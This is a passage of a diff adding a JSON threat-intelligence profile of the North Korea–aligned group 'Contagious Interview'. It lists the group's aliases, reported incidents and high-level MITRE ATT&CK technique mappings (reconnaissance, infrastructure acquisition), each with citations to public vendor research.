@@ -1,0 +1,3736 @@
+{
+  "aliases": [
+    "DeceptiveDevelopment",
+    "Gwisin Gang",
+    "Tenacious Pungsan",
+    "DEV#POPPER",
+    "PurpleBravo",
+    "TAG-121"
+  ],
+  "attack_id": "G1052",
+  "attack_modified": "2026-11-05T15:11:27.678Z",
+  "attack_url": "https://attack.mitre.org/groups/G1052",
+  "attack_version": "20.1",
+  "attacks": [
+    {
+      "first_seen": null,
+      "id": "G1052",
+      "kind": "group_general",
+      "last_seen": null,
+      "name": "Documented tradecraft (MITRE ATT&CK)",
+      "references": [],
+      "summary": null,
+      "url": "https://attack.mitre.org/groups/G1052"
+    },
+    {
+      "first_seen": "2026-09-22",
+      "id": "INC-0074",
+      "kind": "reported_activity",
+      "last_seen": "2026-09-22",
+      "name": "Japan Dismantles First North Korean Laptop Farm as US and Allies Detail Wider Scheme",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Japan Dismantles First North Korean Laptop Farm as US and Allies Detail Wider Scheme",
+          "url": "https://www.securityweek.com/japan-dismantles-first-north-korean-laptop-farm-as-us-and-allies-detail-wider-scheme/"
+        }
+      ],
+      "summary": null,
+      "url": null
+    },
+    {
+      "first_seen": "2026-11-11",
+      "id": "INC-0013",
+      "kind": "reported_activity",
+      "last_seen": "2026-11-11",
+      "name": "Contagious Interview - One Interview Away From Infection",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "summary": null,
+      "url": null
+    }
+  ],
+  "bfsi": {
+    "reason": "ATT&CK: active since 2023, focused on theft of cryptocurrency and user credentials from developers and crypto-related individuals via fake job interviews.",
+    "tier": 1
+  },
+  "country": "North Korea (DPRK)",
+  "counts": {
+    "attack_rows": 54,
+    "reviewed_rows": 20,
+    "rows": 74,
+    "techniques": 61
+  },
+  "description": "Contagious Interview is a North Korea–aligned threat group active since 2023. The group conducts both cyberespionage and financially motivated operations, including the theft of cryptocurrency and user credentials. Contagious Interview targets Windows, Linux, and macOS systems, with a particular focus on individuals engaged in software development and cryptocurrency-related activities.",
+  "description_references": [
+    {
+      "citation": "Efstratios Lontzetidis. (2025, January 16). Lazarus APT: Techniques for Hunting Contagious Interview. Retrieved October 20, 2025.",
+      "source_name": "Validin Contagious Interview North Korea ClickFix January 2025",
+      "url": "https://www.validin.com/blog/inoculating_contagious_interview_with_validin/"
+    },
+    {
+      "citation": "eSentire Threat Response Unit (TRU). (2024, November 14). Bored BeaverTail & InvisibleFerret Yacht Club – A Lazarus Lure Pt.2. Retrieved October 17, 2025.",
+      "source_name": "Esentire ContagiousInterview BeaverTail InvisibleFerret November 2024",
+      "url": "https://www.esentire.com/blog/bored-beavertail-invisibleferret-yacht-club-a-lazarus-lure-pt-2"
+    },
+    {
+      "citation": "Ian Kretz, Sebastian Obregoso, Datadog Security Research Team. (2024, October 24). Tenacious Pungsan: A DPRK threat actor linked to Contagious Interview. Retrieved October 20, 2025.",
+      "source_name": "Datadog Contagious Interview Tenacious Pungsan October 2024",
+      "url": "https://securitylabs.datadoghq.com/articles/tenacious-pungsan-dprk-threat-actor-contagious-interview/"
+    },
+    {
+      "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+      "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+      "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+    },
+    {
+      "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+      "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+      "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+    },
+    {
+      "citation": "Seongsu Park. (2024, November 4). From Pyongyang to Your Payroll: The Rise of North Korean Remote Workers in the West. Retrieved October 17, 2025.",
+      "source_name": "Zscaler ContagiousInterview BeaverTail InvisibleFerret November 2024",
+      "url": "https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west"
+    },
+    {
+      "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+      "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+      "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+    },
+    {
+      "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+      "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+      "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+    }
+  ],
+  "description_source": "mitre-attack",
+  "disclaimer": "Group attributions and aliases reflect public reporting by the cited vendors and agencies. Attribution is probabilistic and naming overlaps are imperfect; inclusion does not imply a definitive link to any nation-state. Reviewed auto-mappings are analyst-approved proposals from a local mapping engine. For defensive research only. Not affiliated with or endorsed by MITRE.",
+  "downloads": {
+    "csv": "csv/contagious-interview.csv",
+    "navigator_layer": "layers/contagious-interview.json",
+    "navigator_url": "https://mitre-attack.github.io/attack-navigator/#layerURL=https%3A%2F%2Fmadhavv13.github.io%2Fbfsi%2Flayers%2Fcontagious-interview.json"
+  },
+  "id": "G1052",
+  "last_updated": "2026-11-13",
+  "motivation": "Financial gain (crypto and credential theft)",
+  "name": "Contagious Interview",
+  "notice": "© 2026 The MITRE Corporation. This work is reproduced and distributed with the permission of The MITRE Corporation. MITRE ATT&CK and ATT&CK are registered trademarks of The MITRE Corporation.",
+  "rows": [
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has researched specific professional groups such as software developers for targeting. Contagious Interview has also researched individuals who work in roles related to cryptocurrency and blockchain technologies.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--9dd32755-a5a0-4108-a396-8ac9514497a8",
+        "relationship_modified": "2026-07-31T18:47:54.737Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        },
+        {
+          "citation": "Ryan Sherstobitoff. (2024, October 29). Inside a North Korean Phishing Operation Targeting DevOps Employees. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview October 2024",
+          "url": "https://securityscorecard.com/blog/inside-a-north-korean-phishing-operation-targeting-devops-employees/"
+        },
+        {
+          "citation": "Securonix Threat Research, D.Iuzvyk, T. Peck, O.Kolesnikov. (2024, April 24). Analysis of DEV#POPPER: New Attack Campaign Targeting Software Developers Likely Associated With North Korean Threat Actors. Retrieved October 20, 2025.",
+          "source_name": "Securonix Contagious Interview DEVPOPPER April 2024",
+          "url": "https://www.securonix.com/blog/analysis-of-devpopper-new-attack-campaign-targeting-software-developers-likely-associated-with-north-korean-threat-actors/"
+        },
+        {
+          "citation": "Steve Cobb. (2024, October 29). The Job Offer That Wasn’t: How We Stopped an Espionage Plot. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview FamousChollima October 2024",
+          "url": "https://securityscorecard.com/blog/the-job-offer-that-wasnt-how-we-stopped-an-espionage-plot/"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        },
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        },
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0043",
+          "name": "Reconnaissance",
+          "order": 0,
+          "shortname": "reconnaissance",
+          "url": "https://attack.mitre.org/tactics/TA0043"
+        }
+      ],
+      "technique": {
+        "id": "T1589",
+        "name": "Gather Victim Identity Information",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1589"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has utilized open-source indicator of compromise repositories to determine their exposure to include VirusTotal, and MalTrail.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--c27ebf8d-15e3-4f3c-964c-e0ad5e8ca70a",
+        "relationship_modified": "2026-07-31T18:47:54.835Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0043",
+          "name": "Reconnaissance",
+          "order": 0,
+          "shortname": "reconnaissance",
+          "url": "https://attack.mitre.org/tactics/TA0043"
+        }
+      ],
+      "technique": {
+        "id": "T1593",
+        "name": "Search Open Websites/Domains",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1593"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview had identified and solicited victims through social media such as LinkedIn, X, and Telegram.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--7d527d88-29d3-40d8-9347-48b0f788fcc3",
+        "relationship_modified": "2026-07-31T18:47:54.671Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        },
+        {
+          "citation": "Efstratios Lontzetidis. (2025, January 16). Lazarus APT: Techniques for Hunting Contagious Interview. Retrieved October 20, 2025.",
+          "source_name": "Validin Contagious Interview North Korea ClickFix January 2025",
+          "url": "https://www.validin.com/blog/inoculating_contagious_interview_with_validin/"
+        },
+        {
+          "citation": "Ryan Sherstobitoff. (2024, October 29). Inside a North Korean Phishing Operation Targeting DevOps Employees. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview October 2024",
+          "url": "https://securityscorecard.com/blog/inside-a-north-korean-phishing-operation-targeting-devops-employees/"
+        },
+        {
+          "citation": "Steve Cobb. (2024, October 29). The Job Offer That Wasn’t: How We Stopped an Espionage Plot. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview FamousChollima October 2024",
+          "url": "https://securityscorecard.com/blog/the-job-offer-that-wasnt-how-we-stopped-an-espionage-plot/"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0043",
+          "name": "Reconnaissance",
+          "order": 0,
+          "shortname": "reconnaissance",
+          "url": "https://attack.mitre.org/tactics/TA0043"
+        }
+      ],
+      "technique": {
+        "id": "T1593.001",
+        "name": "Search Open Websites/Domains: Social Media",
+        "parent_id": "T1593",
+        "url": "https://attack.mitre.org/techniques/T1593/001"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview had identified and solicited victims through code repositories such as GitHub.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--33cca522-701f-429a-a0f2-a39f76cf2dd5",
+        "relationship_modified": "2026-07-31T18:47:54.514Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0043",
+          "name": "Reconnaissance",
+          "order": 0,
+          "shortname": "reconnaissance",
+          "url": "https://attack.mitre.org/tactics/TA0043"
+        }
+      ],
+      "technique": {
+        "id": "T1593.003",
+        "name": "Search Open Websites/Domains: Code Repositories",
+        "parent_id": "T1593",
+        "url": "https://attack.mitre.org/techniques/T1593/003"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has registered accounts with Threat Intelligence vendor services to check for reporting associated with their infrastructure and to evaluate new potential infrastructure.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--53404e01-e4dd-451f-a098-65836cd38f9e",
+        "relationship_modified": "2026-07-31T18:47:54.572Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0043",
+          "name": "Reconnaissance",
+          "order": 0,
+          "shortname": "reconnaissance",
+          "url": "https://attack.mitre.org/tactics/TA0043"
+        }
+      ],
+      "technique": {
+        "id": "T1681",
+        "name": "Search Threat Vendor Data",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1681"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has used services such as Astrill VPN.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--899c739b-1b17-4417-ab9f-a97eafa69451",
+        "relationship_modified": "2026-07-31T18:47:54.679Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        },
+        {
+          "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+          "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+          "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1583",
+        "name": "Acquire Infrastructure",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1583"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has registered domains to leverage in their social engineering campaigns. Contagious Interview has also registered domains to utilize for C2.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--3c1136cb-ddfc-4aef-bd87-1e7138086cbe",
+        "relationship_modified": "2026-07-31T18:47:54.529Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+          "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+          "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        },
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        },
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        },
+        {
+          "citation": "Efstratios Lontzetidis. (2025, January 16). Lazarus APT: Techniques for Hunting Contagious Interview. Retrieved October 20, 2025.",
+          "source_name": "Validin Contagious Interview North Korea ClickFix January 2025",
+          "url": "https://www.validin.com/blog/inoculating_contagious_interview_with_validin/"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, April 4). Lazarus Expands Malicious npm Campaign: 11 New Packages Add Malware Loaders and Bitbucket Payloads. Retrieved October 20, 2025.",
+          "source_name": "Socket Contagious Interview NPM April 2025",
+          "url": "https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, July 14). Contagious Interview Campaign Escalates With 67 Malicious npm Packages and New Malware Loader. Retrieved October 19, 2025.",
+          "source_name": "Socket BeaverTail XORIndex HexEval Contagious Interview July 2025",
+          "url": "https://socket.dev/blog/contagious-interview-campaign-escalates-67-malicious-npm-packages"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1583.001",
+        "name": "Acquire Infrastructure: Domains",
+        "parent_id": "T1583",
+        "url": "https://attack.mitre.org/techniques/T1583/001"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has acquired virtual private servers from services such as Stark Industries Solutions and RouterHosting. Contagious Interview has also utilized hosting providers to include Tier[.]Net, Majestic Hosting, Leaseweb Singapore, and Kaopu Cloud.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--a8a36225-90e9-446f-98ac-9a05739f994b",
+        "relationship_modified": "2026-07-31T18:47:54.745Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "eSentire Threat Response Unit (TRU). (2024, November 14). Bored BeaverTail & InvisibleFerret Yacht Club – A Lazarus Lure Pt.2. Retrieved October 17, 2025.",
+          "source_name": "Esentire ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.esentire.com/blog/bored-beavertail-invisibleferret-yacht-club-a-lazarus-lure-pt-2"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        },
+        {
+          "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+          "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+          "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1583.003",
+        "name": "Acquire Infrastructure: Virtual Private Server",
+        "parent_id": "T1583",
+        "url": "https://attack.mitre.org/techniques/T1583/003"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has used web services such as Dropbox to receive stolen data and Google Drive, Firebase, GitHub, and Telegram to disseminate files. Contagious Interview has also used a cloud platform such as Vercel for C2 operations leveraging malicious web applications and static pages. Contagious Interview has also used Slack to coordinate their activities.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--0c98c9a9-a0e4-4f8f-b444-4ba7c3bd38a5",
+        "relationship_modified": "2026-07-31T18:47:54.282Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        },
+        {
+          "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+          "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+          "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, April 4). Lazarus Expands Malicious npm Campaign: 11 New Packages Add Malware Loaders and Bitbucket Payloads. Retrieved October 20, 2025.",
+          "source_name": "Socket Contagious Interview NPM April 2025",
+          "url": "https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, July 14). Contagious Interview Campaign Escalates With 67 Malicious npm Packages and New Malware Loader. Retrieved October 19, 2025.",
+          "source_name": "Socket BeaverTail XORIndex HexEval Contagious Interview July 2025",
+          "url": "https://socket.dev/blog/contagious-interview-campaign-escalates-67-malicious-npm-packages"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        },
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1583.006",
+        "name": "Acquire Infrastructure: Web Services",
+        "parent_id": "T1583",
+        "url": "https://attack.mitre.org/techniques/T1583/006"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has created and maintained personas on code repositories to distribute malicious payloads.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--093ef970-4648-441d-bbc5-d8cf8ebfa7e5",
+        "relationship_modified": "2026-07-31T18:47:54.234Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        },
+        {
+          "citation": "Efstratios Lontzetidis. (2025, January 16). Lazarus APT: Techniques for Hunting Contagious Interview. Retrieved October 20, 2025.",
+          "source_name": "Validin Contagious Interview North Korea ClickFix January 2025",
+          "url": "https://www.validin.com/blog/inoculating_contagious_interview_with_validin/"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, April 4). Lazarus Expands Malicious npm Campaign: 11 New Packages Add Malware Loaders and Bitbucket Payloads. Retrieved October 20, 2025.",
+          "source_name": "Socket Contagious Interview NPM April 2025",
+          "url": "https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, July 14). Contagious Interview Campaign Escalates With 67 Malicious npm Packages and New Malware Loader. Retrieved October 19, 2025.",
+          "source_name": "Socket BeaverTail XORIndex HexEval Contagious Interview July 2025",
+          "url": "https://socket.dev/blog/contagious-interview-campaign-escalates-67-malicious-npm-packages"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
